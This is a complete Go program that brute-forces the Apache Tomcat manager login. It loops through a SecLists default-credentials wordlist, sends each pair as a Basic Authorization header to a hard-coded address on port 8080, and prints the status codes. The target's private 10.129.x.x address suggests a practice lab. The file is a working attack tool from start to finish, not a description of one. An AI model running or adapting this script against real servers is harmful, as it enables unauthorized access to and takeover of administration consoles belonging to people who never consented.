package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
)

func makeRequest(url string, basicAuth string) int {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return 1
	}
	// How to add a basic auth header
	req.Header.Set("Authorization", "Basic "+basicAuth)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return 1
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

func main() {
	file, err := os.Open("/usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	// Close the file once the function ends
	defer file.Close()

	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)

	fmt.Println("Starting Brute Force")

	// Read each line in the file
	for scanner.Scan() {
		pt_basicAuth := scanner.Text()
		fmt.Println(pt_basicAuth)
		strBytes := []byte(pt_basicAuth)

		basicAuth := base64.StdEncoding.EncodeToString(strBytes)
		status_code := makeRequest("http://10.129.136.9:8080/manager/html", basicAuth)
		fmt.Println(status_code)
	}

	// Check for any errors that occurred while scanning the file
	if err := scanner.Err(); err != nil {
		fmt.Println("Error scanning file:", err)
	}
}
